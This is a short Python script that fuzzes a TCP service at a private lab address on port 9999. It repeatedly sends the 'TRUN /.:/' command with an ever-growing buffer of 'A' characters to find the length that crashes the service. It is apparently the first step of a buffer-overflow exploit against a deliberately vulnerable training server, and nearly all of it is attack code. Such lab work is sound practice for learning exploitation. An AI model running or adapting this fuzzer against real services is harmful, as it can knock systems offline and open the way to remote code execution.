import time,sys
import socket

ser = "192.168.225.105"
port = 9999

buf = "A"*100
req = "TRUN /.:/"

while True:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ser, port))
	print("sending buffer size: "+ str(len(buf)))
	s.send(req + buf)
	print(s.recv(1024))
	s.close()
	buf = buf + "A"*10
	time.sleep(1)
